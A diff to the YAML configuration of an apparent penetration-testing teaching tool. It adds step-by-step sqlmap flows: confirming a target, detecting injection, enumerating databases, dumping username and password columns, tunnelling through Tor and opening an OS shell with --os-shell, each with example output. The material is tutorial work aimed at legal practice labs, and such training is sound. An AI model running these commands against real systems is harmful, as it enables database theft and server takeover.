@@ -11,8 +11,168 @@ authorization_text: >
   targets. Practice legally on DVWA, bWAPP, sqli-labs, OWASP Juice Shop, or your own
   lab VM. Interactive shells (Flow H) need a second explicit confirmation. Continue?
 flows:
+  - flow_id: guided
+    title: "Guided first test (START HERE)"
+    goal: "From a vulnerable URL to a minimal, targeted data dump — every input explained."
+    command_builder_id: sqlmap
+    slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: g1
+        title: "Get a legal target URL with a parameter"
+        slot_target: null
+        glossary_refs: [sql_injection, injection_point, parameter]
+        explanation:
+          what: "sqlmap tests a URL that has a PARAMETER — the ?name=value part, e.g. http://site/page.php?id=1. The 'id' is the parameter it will try to inject."
+          why: "SQL injection happens where user input reaches a database query. No parameter = nothing for sqlmap to test."
+          where: "You'll pass this whole URL to -u."
+        find_it: >
+          Never test a site you don't own. Set up a legal practice target: DVWA, OWASP Juice
+          Shop, or sqli-labs (all free, run locally in Docker or a VM). A parameter is anything
+          after a ? in the URL as name=value, joined by &. If a page has a search box or an
+          ?id=, that value is your candidate. Confirm the page loads first (this step).
+        command_anatomy:
+          - {token: "curl", does: "a tool that fetches a URL from the command line"}
+          - {token: "-s", does: "silent — hide the progress meter"}
+          - {token: "-I", does: "fetch only the response headers (just checking it responds)"}
+          - {token: '"http://TARGET/page.php?id=1"', does: "your target URL in quotes; id=1 is the parameter"}
+        try_this: "curl -sI \"http://TARGET/page.php?id=1\""
+        success_criteria: "You get an HTTP response (200 OK), confirming the page and parameter exist."
+        expected_output: |
+          HTTP/1.1 200 OK
+          Date: Tue, 08 Jul 2026 06:20:00 GMT
+          Server: Apache/2.4.41 (Ubuntu)
+          Content-Type: text/html; charset=UTF-8
+        alternatives:
+          - trigger: "you don't have a target to practise on"
+            cause: "No legal vulnerable app set up yet."
+            fix: "Install one: `sudo apt install docker.io` then run DVWA, or download sqli-labs. Only ever test these or systems you own."
+            check: "The practice app's page loads in curl or a browser."
+          - trigger: "404 / connection refused"
+            cause: "Wrong URL or the app isn't running."
+            fix: "Start the app, and double-check the host/port and path."
+            check: "curl returns 200 OK."
+      - step_id: g2
+        title: "Detect whether the parameter is injectable"
+        slot_target: TARGET_PIVOT
+        glossary_refs: [dbms, batch]
+        explanation:
+          what: "sqlmap sends test payloads to the parameter and reports whether it's injectable and which database engine (DBMS) is behind it."
+          why: "This is the safe first move — it only DETECTS, it doesn't read or change data yet."
+          where: "-u carries the URL; --batch tells sqlmap to accept its own sensible defaults instead of asking you questions."
+        find_it: "Use the exact URL you confirmed in step 1, in double quotes so the shell doesn't choke on the ? and &."
+        command_anatomy:
+          - {token: "sqlmap", does: "the program"}
+          - {token: "-u", does: "the URL (with the parameter) to test"}
+          - {token: '"http://TARGET/page.php?id=1"', does: "your target, quoted"}
+          - {token: "--batch", does: "don't prompt — accept default answers automatically"}
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch"
+        success_criteria: "sqlmap says a parameter is injectable and names the DBMS (e.g. MySQL)."
+        expected_output: |
+          [INFO] testing connection to the target URL
+          [INFO] GET parameter 'id' is 'MySQL >= 5.0.12 ...' injectable
+          sqlmap identified the following injection point(s):
+          Parameter: id (GET)
+          ---
+          [INFO] the back-end DBMS is MySQL
+        alternatives:
+          - trigger: "all tested parameters do not appear to be injectable"
+            cause: "The default test depth is too shallow, or you targeted the wrong parameter."
+            fix: "Go deeper: add `--level 3 --risk 2`, and focus one parameter with `-p id`."
+            check: "Re-run with --level 3; injection is reported."
+          - trigger: "it needs a login / the page is POST"
+            cause: "The injectable input is behind authentication or sent in a POST body."
+            fix: "Save the request from your browser/Burp to a file and use the 'Authenticated / POST' reference flow (`-r request.txt`)."
+            check: "sqlmap tests within the logged-in context."
+      - step_id: g3
+        title: "List the databases you can reach"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [dbms]
+        explanation:
+          what: "`--dbs` asks the injectable parameter to list the database names on the server."
+          why: "You map the structure (which databases exist) before touching any actual data."
+          where: "ACTION_OPTIONS — an action added to the same detect command."
+        find_it: "No new input — reuse the URL from step 2. sqlmap remembers the injection it already found (it caches results)."
+        command_anatomy:
+          - {token: "sqlmap -u \"...\" --batch", does: "same as before (target + no prompts)"}
+          - {token: "--dbs", does: "list the databases the injection can see"}
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --dbs"
+        success_criteria: "A list of database names prints."
+        expected_output: |
+          available databases [2]:
+          [*] information_schema
+          [*] shop
+        alternatives:
+          - trigger: "only information_schema shows / limited access"
+            cause: "The injected database user has restricted privileges."
+            fix: "Work with what's readable; `--current-db` shows the app's own database, which is usually the interesting one."
+            check: "`--current-db` names a usable database."
+      - step_id: g4
+        title: "Drill into a database's tables"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "`-D <db> --tables` lists the tables inside one database you saw in the previous step."
+          why: "Narrowing to a database, then a table, keeps you targeted instead of grabbing everything."
+          where: "ACTION_OPTIONS; -D chooses which database."
+        find_it: "Pick a database name from step 3's list (e.g. 'shop', not information_schema). Put it after -D."
+        command_anatomy:
+          - {token: "sqlmap -u \"...\" --batch", does: "target + no prompts"}
+          - {token: "-D shop", does: "choose the database named 'shop'"}
+          - {token: "--tables", does: "list the tables inside it"}
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch -D shop --tables"
+        success_criteria: "The tables of that database print (e.g. users, products)."
+        expected_output: |
+          Database: shop
+          [3 tables]
+          +-----------+
+          | products  |
+          | users     |
+          | orders    |
+          +-----------+
+        alternatives:
+          - trigger: "no tables / database not found"
+            cause: "The -D name doesn't exactly match one from --dbs."
+            fix: "Copy the name exactly as --dbs printed it (case-sensitive on some systems)."
+            check: "Tables list for the correct -D."
+      - step_id: g5
+        title: "Dump only the columns you actually need"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "Extract the MINIMUM required. Avoid --dump-all — over-collecting personal data can breach scope and law even on an authorized test. Dumped data is written to sqlmap's output folder; handle and delete it responsibly."
+        explanation:
+          what: "`-T <table> -C <col1,col2> --dump` extracts just the named columns from one table."
+          why: "You almost never need a whole table. Naming columns (e.g. username,password) is precise and defensible."
+          where: "ACTION_OPTIONS; -T table, -C columns, --dump performs the extraction."
+        find_it: "Choose one table from step 4 and the specific columns you need. To see column names first, run the same command with --columns instead of --dump."
+        command_anatomy:
+          - {token: "sqlmap -u \"...\" --batch", does: "target + no prompts"}
+          - {token: "-D shop", does: "the database"}
+          - {token: "-T users", does: "the table to read"}
+          - {token: "-C username,password", does: "only these columns (comma-separated)"}
+          - {token: "--dump", does: "extract and display the rows"}
+        try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch -D shop -T users -C username,password --dump"
+        success_criteria: "The chosen columns' rows print and are saved under sqlmap's output directory."
+        expected_output: |
+          Database: shop
+          Table: users
+          [3 entries]
+          +----------+------------------+
+          | username | password         |
+          +----------+------------------+
+          | admin    | 5f4dcc3b5aa765...|
+          | alice    | e10adc3949ba59...|
+          +----------+------------------+
+          [INFO] table 'shop.users' dumped to CSV file '~/.local/share/sqlmap/output/...'
+        alternatives:
+          - trigger: "the table is huge / it's very slow"
+            cause: "Dumping many rows over injection is slow."
+            fix: "Limit rows with `--start 1 --stop 20`, and always name specific -C columns."
+            check: "A small, fast sample dumps."
+          - trigger: "passwords are hashes, not plaintext"
+            cause: "Good apps store password hashes, not raw passwords."
+            fix: "That's expected. Cracking those hashes (if authorized) is a job for the john or hashcat tools in this app."
+            check: "You recognise the values as hashes to hand off."
   - flow_id: detect
-    title: "Detect an injection point"
+    title: "Detect an injection point (reference)"
     goal: "Find whether a parameter is injectable and identify the DBMS."
     command_builder_id: sqlmap
     slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT]
@@ -25,8 +185,16 @@ flows:
           what: "`-u` names the URL+parameter under test; `--batch` uses defaults without prompts."
           why: "Lowest-impact starting point — just detect, don't dump."
           where: "TARGET_PIVOT (-u); --batch in GLOBAL_OPTIONS."
+        find_it: "A URL with a parameter (?id=1). Quote it. Practise only on DVWA/sqli-labs/your own app."
+        command_anatomy:
+          - {token: "sqlmap", does: "the program"}
+          - {token: "-u \"...id=1\"", does: "target URL + parameter, quoted"}
+          - {token: "--batch", does: "accept defaults, no prompts"}
         try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch"
         success_criteria: "sqlmap reports a parameter is injectable and names the DBMS."
+        expected_output: |
+          GET parameter 'id' is injectable
+          the back-end DBMS is MySQL
         alternatives:
           - trigger: "all tested parameters do not appear to be injectable"
             cause: "Default depth too shallow, or wrong parameter."
@@ -37,7 +205,7 @@ flows:
             fix: "Use the authenticated flow (-r request.txt or --data/--cookie)."
             check: "Switch to the auth_post flow."
   - flow_id: enum_dbs
-    title: "Enumerate databases"
+    title: "Enumerate databases (reference)"
     goal: "List the databases the parameter can reach."
     command_builder_id: sqlmap
     slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
@@ -50,15 +218,24 @@ flows:
           what: "`--dbs` lists databases; `--current-db`/`--is-dba` show context."
           why: "Map structure before pulling any data."
           where: "ACTION_OPTIONS."
+        find_it: "Reuse the injectable URL from detection; sqlmap caches the injection."
+        command_anatomy:
+          - {token: "sqlmap -u \"...\" --batch", does: "target + no prompts"}
+          - {token: "--dbs", does: "list all databases"}
+          - {token: "--current-db", does: "(optional) just the app's own database"}
         try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --dbs"
         success_criteria: "A list of database names prints."
+        expected_output: |
+          available databases [2]:
+          [*] information_schema
+          [*] shop
         alternatives:
           - trigger: "limited privileges / not a DBA"
             cause: "The injected user has restricted rights."
             fix: "Note the limit; continue with what is readable."
             check: "Try --current-db / --current-user."
   - flow_id: enum_tables
-    title: "Enumerate tables & columns"
+    title: "Enumerate tables & columns (reference)"
     goal: "List tables in a database, then columns in a table."
     command_builder_id: sqlmap
     slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
@@ -70,15 +247,31 @@ flows:
           what: "`-D <db> --tables`, then `-D <db> -T <table> --columns`."
           why: "Narrow scope before any dump."
           where: "ACTION_OPTIONS (-D/-T scope)."
+        find_it: "Use a database name from --dbs, then a table name from --tables."
+        command_anatomy:
+          - {token: "-D shop", does: "the database to look in"}
+          - {token: "-T users", does: "the table to inspect"}
+          - {token: "--columns", does: "list the columns of that table"}
         try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch -D shop -T users --columns"
         success_criteria: "Table list, then the columns of the chosen table."
+        expected_output: |
+          Database: shop
+          Table: users
+          [4 columns]
+          +----------+--------------+
+          | Column   | Type         |
+          +----------+--------------+
+          | id       | int          |
+          | username | varchar(50)  |
+          | password | varchar(255) |
+          +----------+--------------+
         alternatives:
           - trigger: "table/column not found"
             cause: "Wrong database/table name."
             fix: "Re-list with --tables under the right -D."
             check: "Confirm names from the enum step."
   - flow_id: dump
-    title: "Dump data (targeted, minimal)"
+    title: "Dump data (targeted, minimal) (reference)"
     goal: "Extract specific columns only."
     command_builder_id: sqlmap
     slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS, OUTPUT_OPTIONS]
@@ -92,15 +285,29 @@ flows:
           what: "`-D <db> -T <table> -C <c1,c2> --dump` extracts the named columns."
           why: "Pull the minimum you need; results auto-save to the output dir."
           where: "ACTION_OPTIONS; --output-dir in OUTPUT_OPTIONS."
+        find_it: "Name the exact columns you need (from --columns). Prefer 2-3 columns over a whole table."
+        command_anatomy:
+          - {token: "-D shop -T users", does: "database and table"}
+          - {token: "-C username,password", does: "only these columns"}
+          - {token: "--dump", does: "extract the rows"}
+          - {token: "--start 1 --stop 20", does: "(optional) only the first 20 rows"}
         try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch -D shop -T users -C username,password --dump"
         success_criteria: "The selected columns' rows are extracted and saved."
+        expected_output: |
+          Table: users
+          [2 entries]
+          +----------+-------------------+
+          | username | password          |
+          +----------+-------------------+
+          | admin    | 5f4dcc3b5aa765... |
+          +----------+-------------------+
         alternatives:
           - trigger: "huge table / very slow"
             cause: "Dumping an entire large table."
             fix: "Limit rows with --start/--stop, and prefer specific -C."
             check: "Re-run with --start 1 --stop 20."
   - flow_id: tune
-    title: "Tune level, risk & technique (the depth dial)"
+    title: "Tune level, risk & technique (reference)"
     goal: "Trade speed for thoroughness deliberately."
     command_builder_id: sqlmap
     slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ACTION_OPTIONS]
@@ -113,8 +320,16 @@ flows:
           what: "`--level 1..5` (how many places), `--risk 1..3` (payload heaviness), `--technique=BEU` (types)."
           why: "Higher finds more but is slower/noisier; --dbms hints the backend."
           where: "ACTION_OPTIONS."
+        find_it: "No new input — you're adding tuning flags to a detection you already know how to run."
+        command_anatomy:
+          - {token: "--level 4", does: "test more places (cookies, headers) — 1 to 5"}
+          - {token: "--risk 2", does: "use heavier payloads — 1 to 3"}
+          - {token: "--technique=BEU", does: "limit to Boolean, Error, Union techniques"}
         try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --level 4 --risk 2 --technique=BEU"
         success_criteria: "Detection succeeds within acceptable time."
+        expected_output: |
+          [INFO] testing 'MySQL >= 5.0 boolean-based blind'
+          [INFO] GET parameter 'id' is injectable
         alternatives:
           - trigger: "too slow"
             cause: "High level/risk or broad technique set."
@@ -125,7 +340,7 @@ flows:
             fix: "Raise --level (and --risk if authorized)."
             check: "Re-test at --level 5."
   - flow_id: auth_post
-    title: "Authenticated / POST / saved request"
+    title: "Authenticated / POST / saved request (reference)"
     goal: "Test inside a logged-in context."
     command_builder_id: sqlmap
     slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, EXTRA_FILES]
@@ -138,15 +353,28 @@ flows:
           what: "`-r request.txt` carries target+headers+cookies+body from a saved HTTP request."
           why: "Best way to test logged-in apps; --data/--cookie are alternatives."
           where: "TARGET_PIVOT (-r); POST/cookie data in EXTRA_FILES."
+        find_it: >
+          In Burp Suite or your browser's dev tools, copy the raw HTTP request for the page
+          (right-click a request in Burp -> Copy to file), save it as request.txt. It contains
+          the cookies that keep you logged in.
+        command_anatomy:
+          - {token: "sqlmap", does: "the program"}
+          - {token: "-r request.txt", does: "read the full HTTP request (URL, headers, cookies, body) from this file"}
+          - {token: "-p id", does: "focus testing on the 'id' parameter"}
+          - {token: "--batch", does: "no prompts"}
         try_this: "sqlmap -r request.txt --batch -p id"
         success_criteria: "sqlmap tests within the authenticated context."
+        expected_output: |
+          [INFO] parsing HTTP request from 'request.txt'
+          [INFO] testing 'id' ...
+          GET parameter 'id' is injectable
         alternatives:
           - trigger: "session expired mid-run"
             cause: "Cookie/request file went stale."
             fix: "Refresh the cookie/request file; consider --csrf-token options."
             check: "Re-export the request and retry."
   - flow_id: proxy_tor
-    title: "Through a proxy / Tor / blend in"
+    title: "Through a proxy / Tor / blend in (reference)"
     goal: "Route and pace traffic."
     command_builder_id: sqlmap
     slots: [PROGRAM, GLOBAL_OPTIONS, TARGET_PIVOT, ENV_INTERFACE]
@@ -159,8 +387,15 @@ flows:
           what: "`--proxy http://127.0.0.1:8080` routes via Burp/ZAP; `--tor --check-tor` anonymizes."
           why: "Watch traffic, pace with --delay/--threads, vary UA with --random-agent."
           where: "ENV_INTERFACE (proxy/tor)."
+        find_it: "Start Burp/ZAP listening on 127.0.0.1:8080 first; that's the proxy address to pass."
+        command_anatomy:
+          - {token: "--proxy http://127.0.0.1:8080", does: "send all traffic through your local Burp/ZAP proxy"}
+          - {token: "--random-agent", does: "use a random browser User-Agent each run"}
         try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --proxy http://127.0.0.1:8080 --random-agent"
         success_criteria: "Requests appear in your proxy; scan proceeds."
+        expected_output: |
+          [INFO] setting HTTP proxy to '127.0.0.1:8080'
+          (requests now visible in Burp/ZAP's history)
         alternatives:
           - trigger: "blocked by a WAF"
             cause: "A web application firewall is filtering payloads."
@@ -181,8 +416,16 @@ flows:
           what: "`--sql-shell` (interactive SQL), `--os-shell` (OS commands where allowed)."
           why: "High impact — depends on DBMS/privileges/stacked-query support."
           where: "ACTION_OPTIONS."
+        find_it: "Only proceed with written authorization. Confirm you have DBA rights first with --is-dba."
+        command_anatomy:
+          - {token: "--os-shell", does: "attempt an interactive operating-system shell on the DB server"}
+          - {token: "--is-dba", does: "(check first) is the DB user an administrator?"}
         try_this: "sqlmap -u \"http://TARGET/page.php?id=1\" --batch --os-shell"
         success_criteria: "An interactive shell opens (only on authorized targets)."
+        expected_output: |
+          [INFO] going to use a web backdoor for command prompt
+          os-shell> id
+          uid=33(www-data) gid=33(www-data)
         alternatives:
           - trigger: "shell not available"
             cause: "DBMS/privileges/stacked queries don't support it."
